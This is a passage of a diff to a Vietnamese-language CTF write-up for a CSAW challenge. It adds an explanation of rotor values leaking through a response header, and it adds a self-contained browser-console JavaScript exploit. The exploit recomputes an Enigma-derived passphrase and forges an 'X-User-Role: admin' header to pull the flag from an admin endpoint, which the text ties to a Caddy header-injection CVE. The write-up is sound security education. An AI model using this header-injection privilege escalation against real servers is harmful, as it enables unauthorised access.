@@ -60,6 +60,14 @@ async def clubs(req):
 # /balls -> R2 (Rotor II), /bags -> R3 (Rotor III)
 ```
 
+Truy cập thẳng một endpoint pro-shop trên trình duyệt, ta thấy nó trả `I'm a teapot.` (HTTP 418) — còn giá trị rotor thì nằm ở header `X-Golf-Hint` (mở tab Network để đọc):
+
+![image](./02-proshop-418.png)
+
+Bảng `WORDS` cũng công khai luôn tại `GET /api/word-table`:
+
+![image](./03-word-table.png)
+
 Giải base64 -> được `R1,R2,R3`, chạy lại đúng hàm `enigma()` của đề -> 3 chữ cái -> tra bảng `WORDS` (index `[0],[1],[0]` — cũng lộ qua `GET /api/word-table`) -> ghép thành mật khẩu. Server tự tay đưa hết mọi mảnh ghép; không cần phá mã Enigma gì cả.
 
 ### Lớp 2 — Header Injection (Caddy CVE GHSA-7r4p-vjf4-gxv4)
@@ -167,8 +175,31 @@ Kết quả chạy thực tế (local, flag giả để verify):
 [+] FLAG: csaw{fake_local_flag_verify_123}
 ```
 
-Toàn bộ chuỗi khai thác cũng làm được ngay trên trình duyệt (DevTools Console): `fetch` ba endpoint pro-shop để đọc rotor rò rỉ qua header `X-Golf-Hint`, rồi `POST /api/vault/admin-item` kèm header **`X-User-Role: admin`** là ra flag. Ảnh dưới chạy local với flag demo (`csaw{c4ddy...}`); trên server thi đấu, flag thật lấy từ biến môi trường `FLAG`:
+Toàn bộ chuỗi khai thác cũng làm được **hoàn toàn trong trình duyệt**, không cần chạy lệnh ngoài: mở DevTools -> Console và dán đoạn tự-chứa dưới (fetch rotor từ header -> tính `enigma` -> `POST` kèm header injection):
 
-![image](./02-flag.png)
+```javascript!
+(async () => {
+  const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  const W = { I:"EKMFLGDQVZNTOWYHXUSPAIBRCJ", II:"AJDKSIRUXBLHWTMCQGZNPYFVOE",
+              III:"BDFHJLCPRTXVZNYEIWGAKMUSQO", REF:"YRUHQSLDPXNGOKMIEBFZCWVJAT" };
+  const WORDS = (await (await fetch('/api/word-table')).json()).table;
+  const hint = async p => parseInt(atob((await fetch(p)).headers.get('X-Golf-Hint')), 10);
+  const R1 = await hint('/pro-shop/inventory/clubs'),
+        R2 = await hint('/pro-shop/inventory/balls'),
+        R3 = await hint('/pro-shop/inventory/bags');
+  const f = (c,w,o) => w[(A.indexOf(c)+o)%26];
+  const L = ["G","O","L"].map(s => { let c=s; c=f(c,W.I,R1%26); c=f(c,W.II,R2%26);
+              c=f(c,W.III,R3%26); c=W.REF[A.indexOf(c)]; c=f(c,W.III,(26-R3%26)%26); return c; });
+  const phrase = [WORDS[L[0]][0], WORDS[L[1]][1], WORDS[L[2]][0]].join(' ');
+  const j = await (await fetch('/api/vault/admin-item', { method:'POST',
+      headers: { 'content-type':'application/json', 'X-User-Role':'admin' },
+      body: JSON.stringify({ phrase }) })).json();
+  return j.flag;
+})();
+```
 
--> Flag: `csaw{...}` (flag thật lấy từ biến môi trường `FLAG` của instance online — chạy `exploit.py` với URL server thi đấu)
+:::warning
+Bản source công khai **không kèm flag thật** — flag thật do BTC bơm qua biến môi trường `FLAG` trên server thi đấu (giải đã kết thúc, không còn instance). Vì vậy ảnh/kết quả bên dưới chạy **local với flag demo** `csaw{fake_local_flag_verify_123}` để kiểm chứng exploit chạy đúng; chỗ này trên server thật sẽ là flag thật.
+:::
+
+-> Flag (demo local): `csaw{fake_local_flag_verify_123}`
